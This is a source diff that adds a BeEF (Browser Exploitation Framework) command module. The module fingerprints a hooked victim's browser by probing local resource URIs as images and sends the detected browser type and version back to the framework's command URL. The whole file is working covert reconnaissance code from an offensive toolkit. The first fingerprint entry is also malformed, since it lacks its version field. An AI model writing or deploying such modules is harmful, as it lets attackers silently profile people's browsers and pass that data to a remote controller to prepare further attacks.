@@ -1,0 +1,58 @@
+//
+//   Copyright 2011 Wade Alcorn wade@bindshell.net
+//
+//   Licensed under the Apache License, Version 2.0 (the "License");
+//   you may not use this file except in compliance with the License.
+//   You may obtain a copy of the License at
+//
+//       http://www.apache.org/licenses/LICENSE-2.0
+//
+//   Unless required by applicable law or agreed to in writing, software
+//   distributed under the License is distributed on an "AS IS" BASIS,
+//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+//   See the License for the specific language governing permissions and
+//   limitations under the License.
+//
+beef.execute(function() {
+
+	var browser_type = new Array;
+	var browser_version = new Array;
+	var dom = document.createElement('b');
+
+	Array.prototype.unique = function() {
+		var o = {}, i, l = this.length, r = [];
+		for(i=0; i<l;i+=1) o[this[i]] = this[i];
+		for(i in o) r.push(o[i]);
+		return r;
+	};
+
+	parse_browser_details = function() {
+		if (!browser_type.length) browser_type[0] = "unknown";
+		if (!browser_version.length) browser_version[0] = "unknown";
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "browser_type="+browser_type.unique()+"&browser_version="+browser_version.unique());
+	};
+
+	// Browser fingerprints // in the form of: "URI","Browser","version(s)"
+	var fingerprints = new Array(
+		new Array("Firefox","moz-icon://.autoreg?size=16"),
+		new Array("Firefox","2.x","resource:///res/html/gopher-audio.gif"),
+		new Array("Firefox","2.x-3.x","jar:resource:///chrome/classic.jar!/skin/classic/browser/Secure.png"),
+		new Array("Firefox","4.x-5.x","resource:///chrome/browser/skin/classic/browser/Secure.png"),
+		new Array("Firefox","4+","resource:///chrome/browser/skin/classic/browser/Geolocation-16.png"),
+		new Array("Internet Explorer","5.x-6.x","res://shdoclc.dll/pagerror.gif"),
+		new Array("Internet Explorer","7+","res://ieframe.dll/info_48.png")
+	);
+
+	for (var i=0; i<fingerprints.length; i++) {
+		var img = new Image;
+		img.id = fingerprints[i][0];
+		img.name = fingerprints[i][1];
+		img.src = fingerprints[i][2];
+		img.onload = function() { browser_type.push(this.id); browser_version.push(this.name); dom.removeChild(this); }
+		dom.appendChild(img);
+	}
+
+	setTimeout('parse_browser_details();', 2000);
+
+});
+
